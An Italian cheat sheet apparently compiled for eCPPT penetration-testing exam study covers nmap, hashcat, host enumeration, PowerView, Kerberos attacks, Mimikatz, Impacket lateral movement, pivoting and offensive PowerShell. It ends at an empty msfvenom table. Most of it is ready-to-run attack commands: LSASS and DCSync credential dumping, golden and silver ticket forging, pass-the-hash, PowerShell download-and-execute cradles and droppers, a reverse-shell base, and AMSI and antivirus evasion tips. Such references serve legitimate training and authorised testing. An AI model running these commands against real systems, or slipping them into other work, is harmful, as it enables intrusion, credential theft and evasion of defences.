---
title: "10 — Cheat Sheet"
tags:
  - active-directory
  - ad-enumeration
  - as-rep-roasting
  - asm
  - av-evasion
  - bloodhound
  - bof
  - c2
  - cheatsheet
  - client-side
  - crackmapexec
  - credentials
  - dcsync
  - dll-hijacking
  - empire
  - golden-ticket
  - hta
  - kerberoasting
  - kerberos
  - lateral-movement
  - linux-privesc
  - macro
  - macropack
  - metasploit
  - mimikatz
  - msfvenom
  - nmap
  - nse
  - ntlm
  - obfuscation
  - pass-the-hash
  - pass-the-ticket
  - persistence
  - phishing
  - pivoting
  - port-forwarding
  - powerview
  - reference
  - regeorg
  - registers
  - scanning
  - seh
  - shellcode
  - shellter
  - silver-ticket
  - smb
  - smb-relay
  - socks
  - stack
  - sudo
  - suid
  - uac-bypass
  - windows-privesc
  - winrm
---
# 10 — Cheat Sheet

> **Riferimento rapido consolidato.** Tutte le cheat sheet del corso eCPPT raccolte in un unico documento, organizzate per dominio. Ogni gruppo di comandi è preceduto da una breve descrizione contestualizzante e dall'indicazione del modulo di origine.

## Indice

- [Assembly & System Internals](#assembly-system-internals)
- [Nmap & Scanning](#nmap-scanning)
- [Hashcat — modes & cracking](#hashcat-modes-cracking)
- [Enumeration — Windows & Linux](#enumeration-windows-linux)
- [Active Directory — Power⁠View](#active-directory-powerview)
- [Kerberos Attacks](#kerberos-attacks)
- [Mimi⁠katz](#mimi⁠katz)
- [Impacket Suite & Lateral Movement](#impacket-suite-lateral-movement)
- [Pivoting — proxychains, SOCKS, SSH, reGeorg](#pivoting)
- [PowerShell offensive](#powershell-offensive)
- [Client-Side: msfvenom payloads](#client-side-msfvenom-payloads)
- [Client-Side: MacroPack](#client-side-macropack)
- [Client-Side: PowerShell switches per macro](#client-side-powershell-switches-per-macro)
- [Command & Control: Em⁠pire CLI](#command-control-empire-cli)
- [Command & Control: integrazione MSF (web_delivery + pivot)](#command-control-integrazione-msf)
- [Buffer Overflows: Mona.py](#buffer-overflows-monapy)
- [Buffer Overflows: msfvenom shellcode](#buffer-overflows-msfvenom-shellcode)

---

## Assembly & System Internals

> **Contesto:** memo registri x86, memory layout, stack frame, sezioni NASM, sintassi Intel vs AT&T, GDB e syscall Linux. Prerequisito hard per il modulo Buffer Overflows.
> **Origine:** modulo System Security & x86 Assembly Fundamentals.

### Registri x86 (memo)
```
EAX  Accumulator        → ret value, syscall #
EBX  Base                → arg1 syscall
ECX  Counter             → loops, arg2 syscall
EDX  Data                → I/O, arg3 syscall
ESI  Source Index        → string ops (src)
EDI  Destination Index   → string ops (dst)
ESP  Stack Pointer       → top dello stack
EBP  Base Pointer        → base dello stack frame
EIP  Instruction Pointer → next instruction (TARGET dei BO)
```

### Memory layout
```
HIGH  | stack ↓ | (gap) | ↑ heap | bss | data | text/code |  LOW
```

### Stack frame
```
[ args N..1 ] [ ret addr (EIP) ] [ saved EBP ] [ locals ] ← ESP
                                       ↑ EBP
```

### Sezioni NASM
```
section .data   →  db / dw / dd / dq      (init)
section .bss    →  resb / resw / resd / resq  (reserved, zero-filled)
section .text   →  global _start ; codice
```

### Build & run NASM (Linux x86)
```bash
nasm -f elf32 -o prog.o prog.asm
ld   -m elf_i386 -o prog   prog.o
./prog
```

### Syscall x86 (int 0x80)
```
EAX = syscall #   EBX = arg1   ECX = arg2   EDX = arg3
sys_exit  = 1
sys_write = 4
sys_read  = 3
fd: 0=stdin  1=stdout  2=stderr
```

### Pipeline C → eseguibile
```
.c → cpp → .i → cc1 → .s → as/nasm → .o → ld → executable → loader → RAM → CPU
```

### Intel vs AT&T (one-liner)
```
Intel:   mov eax, 4       (dest, src)
AT&T :   movl $4, %eax    (src,  dest)   ; % registri, $ immediati, l/w/b suffisso
```

### GDB minimal kit
```
set disassembly-flavor intel
info functions
disassemble _start
break *_start+N
run
x /s &var ; x /x &var
info registers
```

### Idiomi shellcode-friendly
```
xor eax, eax     ; EAX = 0 senza byte 0x00
xor ebx, ebx     ; idem per EBX
```

### Direzioni di crescita (MEMORIZZARE!)
```
stack  : high → low   (push ↓ ESP)
heap   : low → high   (malloc/sbrk ↑)
```

---

## Nmap & Scanning

> **Contesto:** queste opzioni sono il cuore della fase di **scanning & enumeration** in un pentest di rete. Conoscerle a memoria è cruciale per l'esame eCPPT 2024 (45 domande pratiche).
> **Origine:** modulo Network Penetration Testing.

| Flag | Categoria | Scopo | Esempio / Note |
|---|---|---|---|
| `-h` | Help | Menu sintetico | `nmap -h` |
| `man nmap` | Help | Doc completa | `/pattern` per cercare |
| `-iL <file>` | Target | Lista target da file | un IP/range per riga |
| `--exclude <ip>` | Target | Escludi IP | |
| `--excludefile <f>` | Target | Escludi da file | |
| **`-sn`** | Discovery | **Ping Scan** (no port scan): ICMP+SYN/443+ACK/80+timestamp; ARP in LAN | |
| **`-Pn`** | Discovery | **Skip host discovery**, assume up | Vital contro host firewallati |
| `-PE` | Discovery | ICMP echo (type 8) | |
| `-PP` | Discovery | ICMP timestamp (type 13) | Bypass se `-PE` filtrato |
| `-PM` | Discovery | ICMP address mask (type 17) | Legacy |
| `-PR` | Discovery | ARP ping | Default in LAN |
| `-PS<ports>` | Discovery | TCP SYN ping | Default port 80; multi-porta riduce FN |
| `-PA<ports>` | Discovery | TCP ACK ping | Bypass firewall stateless |
| `-PU<ports>` | Discovery | UDP ping | Default 40125 |
| `-PO<proto>` | Discovery | IP protocol ping | `-PO1`=ICMP, `-PO2`=IGMP |
| `--send-ip` | Discovery | Forza probe L3 anche in LAN | Override ARP |
| `--traceroute` | Discovery | Path tracing | |
| `-n` | DNS | No DNS resolution | OPSEC + velocità |
| `-R` | DNS | Force DNS sempre | |
| `--dns-servers a,b` | DNS | DNS custom | |
| **`-sS`** | Scan | **SYN/Stealth/Half-open** (root) | SYN → SYN/ACK → RST |
| **`-sT`** | Scan | **TCP Connect** (no root) | Full handshake, rumoroso |
| **`-sU`** | Scan | UDP scan | Lento, ambiguo |
| `-sA` | Scan | ACK scan (firewall detection) | `filtered` vs `unfiltered` |
| `-sF` | Scan | FIN scan | Solo FIN |
| `-sN` | Scan | NULL scan | Nessun flag |
| `-sX` | Scan | Xmas scan | FIN+PSH+URG |
| `-sW` | Scan | Window scan | |
| `-sM` | Scan | Maimon (FIN+ACK) | |
| `-sY` | Scan | SCTP INIT | |
| `-sO` | Scan | IP Protocol scan | |
| `-p <ports>` | Porte | Porte custom | `-p 80,443` / `-p 1-1000` / `-p T:80,U:53` |
| `-p-` | Porte | Tutte le 65 535 TCP | |
| `-F` | Porte | Fast scan (top 100) | |
| `--top-ports N` | Porte | Top N più comuni | |
| **`-sV`** | Detection | Service VERSION | Banner + probe DB |
| **`-O`** | Detection | OS detection (TCP/IP fingerprint) | Richiede 1 open + 1 closed |
| **`-A`** | Detection | Aggressive = `-sV -O -sC --traceroute` | NON include timing |
| `--osscan-guess` | Detection | Forza guess OS | Output con % |
| `--osscan-limit` | Detection | OS scan solo se 1 open + 1 closed | |
| `--version-intensity 0-9` | Detection | Intensità sV (default 7) | |
| `--version-light` | Detection | = intensity 2 | |
| `--version-all` | Detection | = intensity 9 | |
| **`-sC`** | NSE | Default script scan | = `--script=default` |
| `--script=<n>` | NSE | Script specifico | `.nse` opzionale |
| `--script=<cat>` | NSE | Per categoria | `vuln`, `discovery`, `safe`, `brute`, ... |
| `--script="ftp-*"` | NSE | Wildcard | |
| `--script-help=<n>` | NSE | Help script | |
| `--script-args=k=v` | NSE | Argomenti script | |
| `--script-updatedb` | NSE | Aggiorna DB script | |
| `-f` / `-ff` | Evasion | Frammenta probe (8/16 byte) | A livello IP |
| `--mtu <N>` | Evasion | MTU custom (multiplo di 8) | |
| `-D <ip1>,ME,<ip2>` | Evasion | Decoy IPs (ME = posizione propria) | Devono essere reachable |
| `-g <port>` / `--source-port` | Evasion | Spoof source port | Es. 53, 80, 88 |
| `--data-length N` | Evasion | Payload random | Cambia signature |
| `--ttl N` | Evasion | TTL custom | Fingerprint evasion |
| `--badsum` | Evasion | Checksum invalido | Solo IDS naive |
| `-T0..-T5` | Timing | Paranoid/Sneaky/Polite/Normal/Aggressive/Insane | Default T3 |
| `--scan-delay <t>` | Timing | Delay tra probe | `5s`, `15s`, `500ms` |
| `--max-rate N` | Timing | Cap pacchetti/sec | |
| `--min-rate N` | Timing | Minimo pacchetti/sec | |
| `--host-timeout <t>` | Timing | Abbandona host lenti | |
| `--max-retries N` | Timing | Default 10 | |
| **`-oN <f>`** | Output | Normal (txt) | Report |
| **`-oX <f>`** | Output | XML | Import Metasploit |
| **`-oG <f>`** | Output | Grepable | Pipeline shell |
| `-oS <f>` | Output | ScriptKiddie | Raramente utile |
| **`-oA <base>`** | Output | Tutti i 3 principali | `.nmap`/`.xml`/`.gnmap` |
| `-v` / `-vv` | Output | Verbosity | Solo terminale |
| `--reason` | Output | Mostra causa stato porta | |
| `--open` | Output | Mostra solo porte open | |
| `--reason --packet-trace` | Debug | Mostra ogni probe inviato | |

> **Pivoting + Nmap:** NON funziona con probe raw/ICMP via proxychains → usare **`-sT -Pn`**.

---

## Hashcat — modes & cracking

> **Contesto:** dopo aver estratto un hash (NTLM, NetNTLMv1/v2, Kerberos TGS/AS-REP, ecc.) serve la giusta `-m` di hashcat. Conoscere le mode più comuni evita di crackare con la modalità sbagliata e perdere ore. Consolidato con i modes Kerberos del modulo Active Directory.
> **Origine:** moduli Network Penetration Testing + Active Directory.

| Mode | Tipo | Format prefisso | Dove |
|---|---|---|---|
| **1000** | **NTLM (NT hash)** | (32 hex) | Dump SAM/LSASS, Mimi⁠katz, hash⁠dump |
| **3000** | LM | | Win pre-Vista |
| **5500** | **NetNTLMv1** | challenge:response | Sniff/Responder (challenge-response v1) |
| **5600** | **NetNTLMv2** | challenge:response | **Responder** (challenge-response v2) |
| **13100** | Kerberos 5 TGS-REP etype 23 | `$krb5tgs$23$...` | **Kerberoasting** (AD) |
| **18200** | Kerberos 5 AS-REP etype 23 | `$krb5asrep$23$...` | **AS-REP Roasting** (AD) |
| `19600` | Kerberos 5 TGS-REP etype 17 (AES128) | `$krb5tgs$17$...` | Kerberoast AES128 |
| `19700` | Kerberos 5 TGS-REP etype 18 (AES256) | `$krb5tgs$18$...` | Kerberoast AES256 |
| `19800` | Kerberos 5 AS-REP etype 17 (AES128) | `$krb5asrep$17$...` | AS-REP Roast AES128 |
| `19900` | Kerberos 5 AS-REP etype 18 (AES256) | `$krb5asrep$18$...` | AS-REP Roast AES256 |
| **1800** | sha512crypt | | `/etc/shadow` Linux moderno |
| **500** | md5crypt | | `/etc/shadow` Linux legacy |
| **22000** | WPA-PBKDF2-PMKID+EAPOL | | WiFi |

### John the Ripper — format equivalenti

| Format | Equivalente Hashcat |
|---|---|
| `--format=nt` | 1000 |
| `--format=lm` | 3000 |
| `--format=netntlm` | 5500 |
| `--format=netntlmv2` | 5600 |
| `--format=krb5tgs` | 13100 |
| `--format=krb5asrep` | 18200 |

> **Importante**: `NTLM hash` (NT hash) ≠ `NetNTLM`. Il primo è statico nel SAM; il secondo è challenge-response sulla rete. Mode hashcat **diversi** (1000 vs 5500/5600).

---

## Enumeration — Windows & Linux

> **Contesto:** comandi base da memorizzare per la prima ricognizione post-foothold. Servono sia in fase di privilege escalation che di lateral movement.
> **Origine:** modulo Privilege Escalation.

### Windows enumeration

| Comando | Scopo |
|---|---|
| `whoami` | Utente corrente |
| `whoami /priv` | Privilegi del token corrente (`Se*Privilege`) |
| `whoami /groups` | Gruppi + integrity level (`Medium Mandatory Level` = filtered) |
| `net user` | Utenti locali |
| `net user <user>` | Dettagli utente (membership) |
| `net localgroup administrators` | Membri admin locale |
| `systeminfo` | OS version, build, hotfix → cerca kernel CVE |
| `wmic qfe list` | Hotfix installati |
| `ipconfig /all` | Network config |
| `route print` | Routing table |
| `arp -a` | ARP table |
| `netstat -ano` | Connessioni TCP/UDP |
| `tasklist /v` | Processi con utente proprietario |
| `sc query state= all` | Lista servizi |
| `sc qc <service>` | Config dettaglio servizio (binPath, StartName) |
| `reg query "HKLM\..\Winlogon" /v DefaultPassword` | AutoLogon creds |
| `cmdkey /list` | Credential Manager |
| `cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | PS history |
| `Get-Acl <path> \| Format-List` | ACL file/dir/registry key |
| `icacls <path>` | ACL CLI |
| `accesschk.exe -uwcqv <user> *` | Sysinternals — ACL services |
| `. .\Power⁠Up.ps1; Invoke-PrivescAudit` | Power⁠Up full check |
| `. .\PrivescCheck.ps1; Invoke-PrivescCheck` | PrivescCheck full check |

### Linux enumeration

| Comando | Scopo |
|---|---|
| `whoami` / `id` / `groups` | Utente e gruppi |
| `uname -a` | Kernel + arch |
| `cat /etc/os-release` | Distro version |
| `cat /etc/passwd` | Utenti |
| `cat /etc/group` | Gruppi (`sudo`, `wheel`, `adm`, `docker`) |
| **`sudo -l`** | **Privilegi sudo** (SEMPRE il primo!) |
| `sudo -ll` | Verbose (vede `env_keep`) |
| `sudo -V` | Versione sudo (per check CVE) |
| `find / -perm -u=s -type f 2>/dev/null` | **SUID binaries** |
| `find / -perm -4000 -type f 2>/dev/null` | Equivalente ottale |
| `find / -perm -2000 -type f 2>/dev/null` | SGID binaries |
| `find / -writable -type f 2>/dev/null` | File scrivibili dal current user |
| `find / -not -type l -perm -o+w 2>/dev/null` | World-writable files |
| `find / -perm -o+w -type d 2>/dev/null` | World-writable directories |
| `ls -la /etc/cron*` | Cron jobs |
| `crontab -l` | Crontab user |
| `cat /etc/crontab` | Crontab di sistema |
| `ps auxf` | Processi |
| `netstat -tunlp` (o `ss -tunlp`) | Servizi in ascolto |
| `cat /etc/exports` | NFS exports |
| `mount` | Mount points (cerca `nosuid` mancante) |
| `getcap -r / 2>/dev/null` | File capabilities (alternative a SUID) |
| `cat ~/.bash_history` | History bash |
| `cat ~/.mysql_history` | History MySQL |
| `ls ~/.ssh/` | Chiavi SSH |
| `cat /home/*/.ssh/authorized_keys 2>/dev/null` | Authorized keys (se readable) |
| `ldd <binary>` | Shared libs caricate |
| `readelf -d <binary>` | RPATH/RUNPATH |
| **LinPEAS** (`linpeas.sh`) | Discovery automatica completa |
| **LinEnum** | Alternative scriptizzata |
| **linux-exploit-suggester** | Suggerisce kernel CVE |

### Risorse fondamentali

- **GTFOBins**: https://gtfobins.github.io — catalogo SUID/Sudo escape Unix.
- **LOLBAS**: https://lolbas-project.github.io — equivalente Windows.
- **PayloadsAllTheThings — PrivEsc**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks**: https://book.hacktricks.xyz
- **UACMe**: https://github.com/hfiref0x/UACME
- **Power⁠Sploit**: https://github.com/PowerShellMafia/Power⁠Sploit
- **PrivescCheck**: https://github.com/itm4n/PrivescCheck
- **Juicy Potato**: https://github.com/ohpe/juicy-potato

---

## Active Directory — Power⁠View

> **Contesto:** Power⁠View (`Power⁠Sploit`) è il coltellino svizzero per LDAP recon su AD da Windows. Tutti i cmdlet sotto si eseguono dopo `. .\Power⁠View.ps1` in PowerShell. L'enumeration non richiede privilegi alti: ogni domain user può leggere LDAP.
> **Origine:** modulo Active Directory.

```powershell
powershell -ep bypass
cd C:\Tools\
. .\Power⁠View.ps1
```

| Cmdlet | Scopo |
|---|---|
| `Get-Domain` | Info dominio corrente |
| `Get-Domain -Domain <name>` | Info di altro dominio (trust) |
| `Get-DomainSID` | SID del dominio (necessario per Golden/Silver) |
| `Get-DomainPolicy` | Policy completa |
| `(Get-DomainPolicy)."System Access"` | Password policy |
| `(Get-DomainPolicy)."Kerberos Policy"` | Kerberos policy (MaxTicketAge, ecc.) |
| `Get-DomainController` | Lista DC |
| `Get-DomainUser` / `Get-NetUser` | Tutti gli utenti |
| `Get-DomainUser -Identity <user>` | Singolo utente |
| `Get-DomainUser -Identity <u> -Properties displayname,memberof,objectsid,useraccountcontrol \| Format-List` | Dettagli completi |
| `Get-DomainUser -SPN` | **Kerberoastable** (utenti con SPN) |
| `Get-DomainUser -PreauthNotRequired` | **AS-REP Roastable** |
| `Get-NetComputer` | Tutti i computer |
| `Get-NetComputer \| Select Name, OperatingSystem` | Filter compatto |
| `Get-NetGroup` | Tutti i gruppi |
| `Get-NetGroup "Domain Admins"` | Dettagli gruppo |
| `Get-NetGroupMember "Domain Admins"` | **Membri di un gruppo** (primo comando di un AD pentest) |
| `Get-NetGroup -UserName <user>` | Gruppi di cui un utente è membro |
| `Find-DomainShare -ComputerName <host> -CheckShareAccess` | Share leggibili dal current user |
| `Get-NetShare` | Share locali |
| `Get-NetGPO` | Enum GPO |
| `Get-NetOU` | Enum OU |
| `Get-NetDomainTrust` | Trust del dominio corrente |
| `Get-NetForest` | Info foresta corrente |
| `Get-NetForestTrust` | Trust forest-wide |
| `Get-NetForestDomain` | Domini nella foresta |
| `Get-DomainTrustMapping` | Mappa completa trust |
| `Get-ObjectAcl -SamAccountName <obj> -ResolveGUIDs` | ACL di un oggetto |
| `Find-InterestingDomainAcl -ResolveGUIDs` | ACE abusabili (GenericAll, WriteDACL, ecc.) |
| `Find-LocalAdminAccess` | Host dove il current user è local admin (cruciale per Lateral Movement) |

---

## Kerberos Attacks

> **Contesto:** mappa unica di tutti gli attacchi Kerberos (Kerberoasting, AS-REP Roasting, PtH, PtT, Golden, Silver, DCSync, Overpass-the-Hash) con tool Windows/Linux equivalenti, RID dei gruppi privilegiati e modes hashcat associati.
> **Origine:** modulo Active Directory.

### Tabella tool → hash mode → comando

| Attacco | Tool (Windows) | Tool (Linux) | Crack | Comando esempio |
|---|---|---|---|---|
| **Kerberoasting** | `Rub⁠eus.exe kerberoast /outfile:tgs.hashes` | `impacket-GetUserSPNs <dom>/<u>:<p> -request -outputfile tgs.hashes` | `hashcat -m 13100` / `john --format=krb5tgs` | vedi sopra |
| **AS-REP Roasting** | `Rub⁠eus.exe asreproast /user:<u> /outfile:hash.txt` | `impacket-GetNPUsers <dom>/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hashes` | `hashcat -m 18200` / `john --format=krb5asrep` | vedi sopra |
| **Pass-the-Hash** | `Mimi⁠katz "sekur⁠lsa::pth /user:<u> /domain:<d> /ntlm:<h> /run:powershell.exe"` | `impacket-psexec <dom>/<u>@<host> -hashes :<NT>` | n/a | `evil-winrm -i <host> -u <u> -H <NT>` ; `crackmapexec smb <host> -u <u> -H <NT>` |
| **Pass-the-Ticket** | `Mimi⁠katz "kerberos::p⁠tt <ticket.kirbi>"` ; `Rub⁠eus.exe ptt /ticket:<b64>` | `export KRB5CCNAME=<file.ccache>` + `impacket-psexec -k -no-pass <dom>/<u>@<host>` | n/a | `Mimi⁠katz "sekur⁠lsa::tickets /export"` per dump |
| **Golden Ticket** | `Mimi⁠katz "kerberos::gol⁠den /user:<u> /domain:<d> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NT> /id:500 /groups:512 /ptt"` | `impacket-ticketer -nthash <KRBTGT_NT> -domain-sid <SID> -domain <d> <u>` | n/a | Persistence dominio-wide |
| **Silver Ticket** | `Mimi⁠katz "kerberos::gol⁠den /domain:<d> /sid:<DOMAIN_SID> /target:<host> /service:<class> /rc4:<SVC_NT> /user:<u> /ptt"` | `impacket-ticketer -nthash <SVC_NT> -domain-sid <SID> -domain <d> -spn <class>/<host> <u>` | n/a | Persistence per singolo servizio |
| **DCSync** | `Mimi⁠katz "lsa⁠dump::dcsync /user:<dom>\krbtgt"` ; `lsa⁠dump::lsa /patch` | `impacket-secretsdump <dom>/<u>@<DC> -hashes :<NT> -just-dc-user krbtgt` | n/a | Prerequisito Golden Ticket |
| **Overpass-the-Hash** | `Mimi⁠katz "sekur⁠lsa::pth /user:<u> /domain:<d> /aes256:<aes256_key>"` ; `Rub⁠eus.exe asktgt /user:<u> /rc4:<NT>` | `impacket-getTGT <dom>/<u> -hashes :<NT>` | n/a | NT hash → TGT |

### RID di gruppi privilegiati (per `/groups` di Mimi⁠katz)

| RID | Gruppo |
|---|---|
| 500 | Administrator (user) |
| 501 | Guest |
| 502 | krbtgt |
| 512 | **Domain Admins** |
| 513 | Domain Users |
| 514 | Domain Guests |
| 515 | Domain Computers |
| 516 | Domain Controllers |
| 518 | Schema Admins |
| 519 | **Enterprise Admins** |
| 520 | Group Policy Creator Owners |
| 544 | Builtin Administrators |
| 548 | Account Operators |
| 549 | Server Operators |
| 551 | Backup Operators |

---

## Mimi⁠katz

> **Contesto:** comandi essenziali di Mimi⁠katz per privilege escalation, credential dump (LSASS, SAM, DCSync), Pass-the-Hash, Kerberos ticket manipulation (ptt/golden/silver).
> **Origine:** modulo Active Directory.

```text
# Privilege escalation in Mimi⁠katz
privilege::de⁠bug
token::elevate

# Dump credenziali
sekur⁠lsa::logonpasswords          # creds in LSASS
sekur⁠lsa::tickets                 # ticket in LSASS
sekur⁠lsa::tickets /export         # esporta in .kirbi

# DCSync-like
lsa⁠dump::lsa /patch                            # local DC dump
lsa⁠dump::lsa /patch /computer:<DC>             # remote DC
lsa⁠dump::lsa /inject /name:<account>           # dump specifico account
lsa⁠dump::dcsync /user:<dom>\krbtgt             # DCSync mode

# Pass-the-Hash
sekur⁠lsa::pth /user:<u> /domain:<d> /ntlm:<h> /run:powershell.exe
sekur⁠lsa::pth /user:<u> /domain:<d> /aes256:<key> /run:powershell.exe   # OPtH AES

# Kerberos
kerberos::li⁠st                                 # ticket cached
kerberos::li⁠st /export                         # esporta in .kirbi
kerberos::p⁠tt <ticket.kirbi>                   # Pass-the-Ticket
kerberos::purge                                # purga ticket
kerberos::gol⁠den /user:<u> /domain:<d> /sid:<DOMAIN_SID> /krbtgt:<h> /id:500 /groups:512 /ptt   # GOLDEN
kerberos::gol⁠den /domain:<d> /sid:<DOMAIN_SID> /target:<host> /service:<class> /rc4:<svc_h> /user:<u> /ptt   # SILVER
```

---

## Impacket Suite & Lateral Movement

> **Contesto:** la triade Impacket (psexec → smbexec → wmiexec) ordinata da più rumorosa a più stealth, più gli equivalenti CrackMapExec/NetExec, Evil-WinRM, MSF PsExec PtH e xfreerdp. Tutti accettano hash NT (`-hashes :<NT>` o `LM:NT`).
> **Origine:** modulo Lateral Movement & Pivoting.

```bash
# === psexec.py — full shell, crea service (LOUD) ===
psexec.py administrator:<password>@<TARGET>
psexec.py -hashes <LM>:<NT> administrator@<TARGET>
psexec.py -hashes 00000000000000000000000000000000:<NT> administrator@<TARGET>
psexec.py domain.local/administrator:<password>@<TARGET>

# === smbexec.py — semi-interactive, no service classico ===
smbexec.py administrator:<password>@<TARGET>
smbexec.py -hashes :<NT> administrator@<TARGET>

# === wmiexec.py — semi-interactive, no service, no ADMIN$ write (STEALTHIEST) ===
wmiexec.py administrator:<password>@<TARGET>
wmiexec.py -hashes :<NT> administrator@<TARGET>
wmiexec.py -shell-type powershell -hashes :<NT> administrator@<TARGET>
wmiexec.py -share C$ -hashes :<NT> administrator@<TARGET>
wmiexec.py domain.local/administrator -hashes :<NT> @<TARGET>

# === Hash format ===
# LM:NT richiesto da -hashes
# Solo NT? → :<NT>  oppure  00000000000000000000000000000000:<NT>
# Entrambi accettati.

# === Risultato (tutti e 3): NT AUTHORITY\SYSTEM ===

# === CrackMapExec / NetExec equivalents ===
crackmapexec smb <TARGET> -u administrator -p '<password>'
crackmapexec smb <TARGET> -u administrator -H <NT_HASH>
crackmapexec smb <TARGET> -u administrator -H <NT_HASH> -x 'whoami'
crackmapexec smb <TARGET> -u administrator -H <NT_HASH> --sam
crackmapexec smb <TARGET> -u administrator -H <NT_HASH> -M wmiexec
crackmapexec winrm <TARGET> -u administrator -H <NT_HASH>

# === Evil-WinRM ===
evil-winrm -u administrator -p '<password>' -i <TARGET>
evil-winrm -u administrator -H <NT_HASH> -i <TARGET>
evil-winrm -u administrator -p '...' -i <TARGET> -S            # SSL (5986)
evil-winrm -u administrator -p '...' -i <TARGET> -s ./scripts  # script in-memory
evil-winrm -u administrator -p '...' -i <TARGET> -r DOMAIN     # Kerberos

# === MSF PsExec PtH ===
use exploit/windows/smb/psexec
set RHOSTS <TARGET>
set SMBUser administrator
set SMBPass 00000000000000000000000000000000:<NT_HASH>
set payload windows/x64/meter⁠preter/reverse_tcp
set LHOST <KALI_IP>
exploit

# === xfreerdp ===
xfreerdp /u:administrator /p:'<password>' /v:<TARGET>
xfreerdp /u:administrator /p:'<password>' /v:<TARGET> /dynamic-resolution +clipboard
# PtH solo se Restricted Admin Mode è abilitato:
xfreerdp /u:administrator /pth:<NT_HASH> /v:<TARGET>  # raramente funziona
```

---

## Pivoting — proxychains, SOCKS, SSH, reGeorg

> **Contesto:** setup unificato per accedere a una subnet interna dopo il foothold. MSF socks_proxy, SSH dynamic forwarding (`-D`) e reGeorg (web shell) servono tutti la stessa porta SOCKS, consumata da proxychains. Regola d'oro: TCP-only, niente UDP/ICMP, nmap **sempre** `-sT -Pn`.
> **Origine:** modulo Lateral Movement & Pivoting.

```bash
# === /etc/proxychains.conf (sezione finale) ===
[ProxyList]
socks4  127.0.0.1 9050
# socks5 127.0.0.1 9050     # se SOCKS5

# === MSF SOCKS proxy ===
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a              # o 5
run -j

# === SSH dynamic forwarding ===
ssh -D 9050 -N -f user@pivot

# === reGeorg ===
python reGeorgSocksProxy.py -p 9050 -u http://pivot/path/tunnel.php

# === Uso unificato (qualunque dei tre setup sopra) ===
proxychains nmap -sT -Pn -p 1-1000 <internal_target>     # -sT (TCP connect), -Pn (no ping)
proxychains curl http://<internal_target>/
proxychains ssh user@<internal_target>
proxychains hydra -l root -P rockyou.txt ssh://<internal_target>
proxychains python exploit.py http://<internal_target>/path
proxychains sqlmap -u http://<internal_target>/index.php?id=1 --batch

# === Regole d'oro ===
# - Porta default 9050 (allineata in MSF/SSH/reGeorg e in proxychains.conf)
# - TCP-only: niente UDP, niente ICMP
# - nmap: SEMPRE -sT -Pn (no -sS SYN scan, no -sn ping sweep)
# - VERSION (4a vs 5) deve coincidere ovunque
# - Verifica listener: netstat -antp | grep 9050
```

---

## PowerShell offensive

> **Contesto:** one-liner d'oro PowerShell per esecuzione stealth, download cradle, reverse shell, bypass policy + mappa "quale tool per quale fase" + trap d'esame ricorrenti. Combinazione vincente endpoint Windows: Shellter (PE on-disk) + Invoke-Obfus⁠cation (script + AMSI).
> **Origine:** modulo PowerShell for Pentesters.

### One-liner d'oro da memorizzare

| Pattern | Uso |
|---|---|
| `powershell.exe -nop -w hidden -ep bypass -c "..."` | Esecuzione stealth |
| `powershell -enc <BASE64-UTF16LE>` | Comando encoded |
| `I⁠EX (New-Object Net.Web⁠Client).Download⁠String('http://…/s.ps1')` | Download cradle classico |
| `iwr -useb http://…/s.ps1 \| iex` | Download cradle moderno |
| `(New-Object Net.Web⁠Client).Download⁠File('http://…/p.exe',"$env:TEMP\p.exe")` | Dropper on-disk |
| `New-Object System.Net.Sockets.TcpClient($ip,$port)` | Reverse shell / port scanner base |
| `Set-ExecutionPolicy Bypass -Scope Process -Force` | Bypass policy senza admin |
| `powershell -Version 2 ...` | Downgrade AMSI |
| `impacket-smbexec user:pass@host` | Shell SYSTEM via SMB |
| `usestager multi/launcher` (Em⁠pire) | One-liner PS encoded |

### Mappa "quale tool per quale fase" (esame)

| Fase | Tool primario | Note |
|---|---|---|
| Recon esterno | Nmap | `-p-`, scan completo |
| Initial access via creds | `impacket-smbexec` | Shell SYSTEM |
| Stager / agent C2 Windows | Em⁠pire `multi/launcher` | One-liner encoded |
| Recon interno via agent | Em⁠pire `situational_awareness/*` | Vista interna |
| Credential dump | Em⁠pire `credentials/mimi⁠katz/logonpasswords` o Power⁠Sploit `Invoke-Mi⁠mi⁠katz` | Richiede admin |
| Privilege escalation locale | Power⁠Up (`Power⁠Sploit`) | Service misconfig, registry, DLL hijacking |
| AD enumeration | Power⁠View (`Get-NetUser`, `Get-NetGroup`) | + Blood⁠Hound |
| Pivoting | MSF `autoroute` + `socks_proxy` | SOCKS5 → tool esterni |
| Lateral movement | Em⁠pire `lateral_movement/invoke_wmi`, PSExec | |
| AV evasion PE | **Shellter** (32-bit PE) | Signature-based |
| AV evasion script PS | **Invoke-Obfus⁠cation** (AST ALL) | + AMSI bypass se Defender |
| Persistence | Em⁠pire `persistence/userland/registry`, profile injection | |

### Trap & domande ricorrenti

- `ExecutionPolicy` NON è una security feature.
- Path `WindowsPowerShell\v1.0\` anche su PS 5.1.
- 32-bit PowerShell vive in `SysWOW64` (counterintuitivo).
- `-Encoded⁠Command` richiede **Base64 di UTF-16LE**, non ASCII.
- `Set-ExecutionPolicy Bypass -Scope Process` ≠ `powershell -ep bypass`.
- `Get-WmiObject` è deprecato in PS 6+ (sostituito da `Get-CimInstance`), ma l'esame copre WMI classico.
- Em⁠pire REST API gira sulla porta **1337**; Star⁠killer default `empireadmin/password123`.
- `web_delivery` TARGET 2 = PowerShell.
- Dopo pivot: **bind_tcp**, non reverse, se l'host non esce.
- Shellter solo PE 32-bit, richiede Wine 32 su Linux.
- Invoke-Obfus⁠cation autore **Daniel Bohannon**, gira anche su Linux via `pwsh`.
- `I⁠EX (New-Object Net.Web⁠Client).Download⁠String(...)` è il pattern offensive #1 → da offuscare sempre.

### Combinazione "vincente" lato endpoint

`Shellter` (PE infection, evade signature on-disk) + `Invoke-Obfus⁠cation` (evade signature script + AMSI parziale) → copre i due vettori principali di AV evasion sul singolo endpoint Windows con Defender base.

---

## Client-Side: msfvenom payloads

> **Contesto:** generazione payload per attacchi client-side (phishing con allegato, HTA, dropper EXE/PS). Lista formati pronti all'uso + regole d'oro per evitare errori comuni.
> **Origine:** modulo Client-Side Attacks.

| Formato / Tipo | Comando |
|---|---|
